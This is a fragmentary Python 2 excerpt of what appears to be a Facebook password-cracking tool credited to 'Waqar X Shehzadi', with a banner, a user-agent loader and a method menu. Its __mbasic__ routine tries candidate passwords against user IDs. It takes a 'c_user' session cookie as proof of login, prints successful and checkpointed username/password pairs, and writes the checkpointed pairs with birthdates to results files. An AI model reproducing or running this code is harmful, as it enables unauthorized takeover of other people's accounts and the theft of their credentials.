...
def mr_error():
    ...
    print logo
    print  """\033[1;92m╭┳✪✪╤──────────────────────────────────✪✪➛➢"""
    print '      AUTHOR  >  Waqar X Shehzadi\n'
    print '      GITHUB   >    Waqarop\n'
...
def check_uag():
    try:
        user_agent = open(' Waqar_ua.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
...
class __crack__:
        ...
        if ___axim_xau___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    os.system('echo -e "\n\n         ╔═━────────────────━━━────────────────━═╗" | lolcat')
                    os.system('echo -e "\n\n                     [CHOSE METHOD]" | lolcat')
                    os.system('echo -e "\n\n              [1] METHOD- Waqar |BASIC| [SLOW]" | lolcat')
    ...
    def __mbasic__(self, user, __axm__):
        ...
        for pw in __axm__:
            ...
            try:
            	_nunu = open('Waqar_ua.txt', 'r').read()
            except (KeyError, IOError):
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r  %s[☆] 》[WAQAR OK]《 %s|%s                 %s' % (H,user,pw,N)
                ...
                try:
                    ...
                    print '\r  %s [×]  [WAQAR CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                ...
                print '\r  %s[×]  [WAQAR CP] %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
